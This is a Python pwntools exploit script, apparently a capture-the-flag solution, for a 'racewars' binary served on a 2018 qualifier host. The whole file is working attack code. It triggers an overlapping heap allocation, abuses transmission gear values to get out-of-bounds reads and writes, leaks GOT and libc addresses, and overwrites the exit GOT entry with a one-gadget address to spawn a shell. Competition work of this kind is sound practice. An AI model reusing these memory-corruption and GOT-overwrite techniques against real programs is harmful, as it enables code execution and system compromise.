#!/usr/bin/env python2

from pwn import *
from conn_bby import solve_chal
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.23.so")
e = ELF("./racewars")
#r = process("./racewars")
#r = process("LD_PRELOAD=./libc-2.23.so ./racewars", shell=True)
r = remote("2f76febe.quals2018.oooverflow.io", 31337)

#r = process("./linux_serverx64")
context.log_level = 'DEBUG'
solve_chal(r)
# first setup our double allocation
def menu():
    r.recvuntil("CHOICE: ")

menu()
r.sendline("1")
r.recvuntil("need?\n")
r.sendline("536870912")

# alloc transmission so it gets allocated on top of our tires
menu()
r.sendline("4")
r.recvuntil("ion? ")
r.sendline("5")

# fill out the rest of the car
menu()
r.sendline("2")
r.sendline("1")
menu()
r.sendline("3")

# set gears of transmission to a high number
for i in xrange(1, 5):
    menu()
    r.sendline("1")
    menu()
    r.sendline(str(i))
    r.recvuntil(": ")
    r.sendline("65535")

#r.interactive()
# now leak mem
def leakb_rel(rel):
    menu()
    r.sendline("4")
    r.recvuntil("modify? ")
    r.sendline(str(rel+1))
    r.recvuntil("is ")
    n = int(r.recvuntil(",")[:-1])
    r.recvuntil("what?: ")
    r.sendline("0")
    r.recvuntil("no)")
    r.sendline("0")
    return chr(n)

def leakq_rel(rel):
    res = ''
    for i in range(0, 8):
        res += leakb_rel(rel+i)
    return u64(res)

#k = leakb_rel(-17)
#print(hex(k))
gears_addr = leakq_rel(-17) - 39
log.info("Gears address: " + hex(gears_addr))
#r.interactive()

def leakq_abs(addr, base):
    return leakq_rel(addr-base)

printf_addr = leakq_abs(e.got["printf"], gears_addr)
libc_base = printf_addr - libc.symbols["printf"]
log.info("Printf @ plt: " + hex(printf_addr))
log.info("Libc base: " + hex(libc_base))
#r.interactive()
def writeb_rel(rel, v):
    menu()
    r.sendline("4")
    r.recvuntil("modify? ")
    r.sendline(str(rel+1))
    r.recvuntil("what?: ")
    r.sendline(str(ord(v)))
    r.recvuntil("no)")
    r.sendline("1")

def writeq_abs(addr, v, base):
    v = p64(v)
    for i in xrange(0, len(v)):
        writeb_rel((addr-base)+i, v[i])

magic = 0xf1147
#magic = 0xb8bcf
log.info("magic address: " + hex(magic + libc_base))
writeq_abs(e.got["exit"], magic+libc_base, gears_addr)
r.interactive()
